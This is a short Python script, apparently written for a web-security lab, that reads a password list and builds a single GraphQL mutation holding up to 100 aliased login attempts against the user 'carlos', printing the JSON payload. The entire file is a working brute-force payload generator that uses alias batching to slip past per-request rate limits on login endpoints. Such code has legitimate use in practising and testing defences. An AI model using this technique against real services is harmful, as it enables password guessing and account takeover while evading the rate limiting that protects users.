import json

# === Config ===
username = "carlos"
password_file = "passwords.txt"
max_attempts = 100  # Number of attempts per request

# === Read passwords ===
with open(password_file, "r") as f:
    passwords = [line.strip() for line in f if line.strip()]

# === Build GraphQL mutation with aliases ===
mutation_lines = ["mutation loginAttempts {"]
for i, password in enumerate(passwords[:max_attempts], 1):
    alias = f"a{i}"
    mutation_lines.append(
        f'  {alias}: login(input: {{username: "{username}", password: "{password}"}}) {{ token success }}'
    )
mutation_lines.append("}")

graphql_query = "\n".join(mutation_lines)

# === Create JSON payload ===
payload = {
    "query": graphql_query
}

# === Output payload JSON ===
print(json.dumps(payload, indent=2))
